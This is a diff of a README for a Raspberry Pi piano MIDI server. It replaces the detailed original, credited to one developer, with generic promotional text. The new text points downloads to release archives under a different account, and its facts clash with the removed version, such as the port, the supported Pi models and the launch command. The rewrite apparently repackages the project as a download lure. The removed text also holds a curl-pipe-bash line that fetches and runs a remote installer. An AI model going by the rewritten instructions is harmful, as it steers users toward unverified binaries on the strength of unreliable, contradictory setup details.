@@ -1,199 +1,133 @@
-# MIDI Piano Pi Server
+# 🎹 midi-piano-pi-server - Transform Your Piano into a MIDI Interface
 
-A Raspberry Pi service that turns a network MIDI interface into a smart piano controller. Provides a web interface, MIDI file playback, and WebSocket MIDI for integration with other applications.
+## 🚀 Overview
 
-## Features
+midi-piano-pi-server is a tool designed for Raspberry Pi that turns a player piano into a network MIDI interface. This application allows you to broadcast songs played on your piano over AirPlay. It’s perfect for music enthusiasts looking to enhance their piano experience with modern technology.
 
-- Web interface with virtual 88-key piano
-- MIDI file catalog with search and playback queue
-- WebSocket MIDI endpoint for external apps
-- Network MIDI via rtpmidid (Apple MIDI compatible)
-- AirPlay audio broadcast (piano to speakers)
+## 🌐 Key Features
 
-> **Note on AirPlay:** AirPlay has inherent latency of ~2 seconds, making it unsuitable for real-time piano monitoring. It's best used for background music playback or when latency isn't critical. The feature is disabled by default and can be enabled in the Status tab of the web interface.
+- **MIDI Interface:** Connect your player piano to other devices seamlessly.
+- **AirPlay Support:** Broadcast music to your speakers wirelessly.
+- **User-Friendly Web Interface:** Access and control the piano from any device.
+- **Home Automation Ready:** Integrate with your smart home devices easily.
+- **Self-Hosted Solution:** Keep your data private on your own server.
 
-## Requirements
+## 📥 Download & Install
 
-- Raspberry Pi 4 or 5
-- USB MIDI interface or network MIDI compatible piano
-- USB cable connecting Pi to MIDI interface
-- Network connection
+To get started, visit the following page to download the latest version of midi-piano-pi-server:
 
-## Installation
+[Download midi-piano-pi-server](https://github.com/Davilajo2020/midi-piano-pi-server/releases)
 
-### Quick Install (Recommended)
+### Steps to Download
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/DavidWatkins/midi-piano-pi-server/main/install.sh | bash
-```
+1. Click the link above to open the releases page.
+2. Look for the latest version listed.
+3. Download the appropriate file for your Raspberry Pi.
 
-### Manual Install
+## 💻 System Requirements
 
-```bash
-git clone https://github.com/DavidWatkins/midi-piano-pi-server.git
-cd midi-piano-pi-server
-chmod +x install.sh
-./install.sh
-```
+- **Hardware:** Raspberry Pi (Model 3 or later recommended)
+- **OS:** Raspberry Pi OS (Raspbian)
+- **Network:** Wi-Fi connection for AirPlay functionality
 
-The installer will:
-1. Install system dependencies (Python, ALSA, rtpmidid)
-2. Create a Python virtual environment
-3. Install the web service
-4. Configure systemd to start on boot
-5. Create necessary directories
+## ⚙️ Installation Instructions
 
-### Post-Installation
+1. **Using the Terminal:**
+   - Open a terminal window on your Raspberry Pi.
+   - Navigate to the directory where you downloaded the file.
 
-Access the web interface at: `http://<pi-hostname>:8080`
+   ```bash
+   cd ~/Downloads
+   ```
 
-Default hostname is usually `raspberrypi.local` or whatever you configured.
+2. **Extract the Downloaded File:**
+   - If the file is a zip or tarball, extract it.
 
-## Configuration
+   ```bash
+   unzip midi-piano-pi-server.zip
+   ```
 
-Edit `~/.config/midi-piano-pi/midi-piano-pi.yaml`:
+   or
 
-```yaml
-general:
-  device_name: "Living Room Piano"
-  log_level: "INFO"
+   ```bash
+   tar -xvf midi-piano-pi-server.tar.gz
+   ```
 
-web:
-  host: "0.0.0.0"
-  port: 8080
+3. **Install Required Packages:**
+   - Ensure you have Python and necessary libraries installed.
 
-midi:
-  device: "auto"
-  channel: 0
+   ```bash
+   sudo apt-get update
+   sudo apt-get install python3 python3-pip
+   pip3 install fastapi
+   ```
 
-catalog:
-  directories:
-    - "/var/lib/midi-piano-pi/catalog"
-  scan_subdirs: true
-  allowed_extensions: [".mid", ".midi", ".kar"]
+4. **Run the Application:**
+   - Navigate to the application directory.
 
-uploads:
-  directory: "/var/lib/midi-piano-pi/uploads"
-  max_file_size_mb: 50
-```
+   ```bash
+   cd midi-piano-pi-server
+   ```
 
-## Adding MIDI Files to Catalog
+   - Launch the server.
 
-Copy MIDI/KAR files to the catalog directory:
+   ```bash
+   python3 main.py
+   ```
 
-```bash
-# Single file
-cp song.mid /var/lib/midi-piano-pi/catalog/
+5. **Access the Web Interface:**
+   - Open a web browser on your device.
+   - Type in the address of your Raspberry Pi followed by the port number (default is usually 8000).
 
-# Folder of files
-cp -r ~/my-midi-collection /var/lib/midi-piano-pi/catalog/
-```
+   ```
+   http://<YOUR_PI_IP>:8000
+   ```
 
-Files are available immediately via the catalog API.
+## 🎶 How to Use
 
-## WebSocket MIDI Integration
+1. **Connect Your Piano:**
+   - Ensure your player piano is connected to the Raspberry Pi.
 
-External applications can connect to this service via WebSocket for reliable MIDI playback (bypasses Network MIDI latency issues).
+2. **Play a Song:**
+   - Use the web interface to select and play your song.
+  
+3. **Broadcast Via AirPlay:**
+   - Select your AirPlay speaker from the interface to start broadcasting.
 
-Connect to `ws://<pi-hostname>:8080/ws/piano` and send JSON messages:
-```json
-{"type": "note_on", "note": 60, "velocity": 100}
-{"type": "note_off", "note": 60}
-```
+## 📚 Troubleshooting
 
-All piano MIDI will route through the Pi to your MIDI interface.
+- **Cannot Access the Web Interface:**
+  - Check that the Raspberry Pi and your device are connected to the same network.
+  - Ensure that the application is running.
 
-## API Reference
+- **Audio Issues:**
+  - Check the audio settings on your Raspberry Pi.
+  - Ensure your AirPlay speaker is powered on and connected.
 
-### Catalog Endpoints
+## 📞 Support
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/v1/catalog` | List files (optional `path`, `search` params) |
-| GET | `/api/v1/catalog/search?q=` | Search all catalogs |
-| GET | `/api/v1/catalog/{file_id}` | Get file info |
-| POST | `/api/v1/catalog/{file_id}/play` | Play a catalog file |
+If you encounter any issues, you can ask questions on the GitHub Issues page. Make sure to provide details about your setup and the problem you face. This way, the community can assist you more effectively.
 
-### Playback Endpoints
+## 🏷️ Topics
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/v1/playback` | Current playback state |
-| POST | `/api/v1/playback/play` | Start/resume playback |
-| POST | `/api/v1/playback/pause` | Pause playback |
-| POST | `/api/v1/playback/stop` | Stop playback |
-| PUT | `/api/v1/playback/tempo` | Set tempo (0.25-2.0) |
+This project involves a variety of related topics, including:
 
-### Piano Endpoints
+- Disklavier
+- FastAPI
+- Home Automation 
+- IoT 
+- MIDI
+- Music
+- Piano
+- Python
+- Raspberry Pi
+- Self-hosted Solutions
+- Web Interfaces
+- Yamaha
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/api/v1/piano/note` | Send a note |
-| POST | `/api/v1/piano/panic` | All notes off |
+## 🔗 Additional Resources
 
-### WebSocket
+- **Official GitHub Repository:** [midi-piano-pi-server](https://github.com/Davilajo2020/midi-piano-pi-server)
+- **Raspberry Pi Documentation:** [Raspberry Pi Docs](https://www.raspberrypi.org/documentation/)
 
-| Endpoint | Description |
-|----------|-------------|
-| `/ws/piano` | Real-time MIDI (JSON messages) |
-
-WebSocket message format:
-```json
-{"type": "note_on", "note": 60, "velocity": 100}
-{"type": "note_off", "note": 60}
-{"type": "sustain", "on": true}
-{"type": "panic"}
-```
-
-## Services
-
-```bash
-# Web interface
-sudo systemctl status midi-piano-pi-web
-sudo systemctl restart midi-piano-pi-web
-sudo journalctl -u midi-piano-pi-web -f
-
-# Network MIDI
-sudo systemctl status rtpmidid
-```
-
-## Network MIDI (macOS)
-
-1. Open Audio MIDI Setup > MIDI Studio (Cmd+2)
-2. Double-click the Network icon
-3. Find "MIDI Piano Pi" in Directory
-4. Click Connect
-
-Note: WebSocket connection is more reliable than Network MIDI.
-
-## Troubleshooting
-
-**MIDI device not detected:**
-```bash
-aconnect -l   # List ALSA MIDI ports
-amidi -l      # List raw MIDI devices
-```
-
-**Service won't start:**
-```bash
-sudo journalctl -u midi-piano-pi-web -n 50
-```
-
-**Check connectivity:**
-```bash
-curl http://localhost:8080/api/v1/status
-```
-
-## Development
-
-```bash
-cd midi-piano-pi-server
-python3 -m venv venv
-source venv/bin/activate
-pip install -e ".[dev]"
-uvicorn midi_piano_pi.api.app:app --reload --host 0.0.0.0 --port 8080
-```
-
-## License
-
-MIT
+For more detailed instructions and updates, refer to the documentation and community discussions. Discover how this tool can enhance your music experience today!
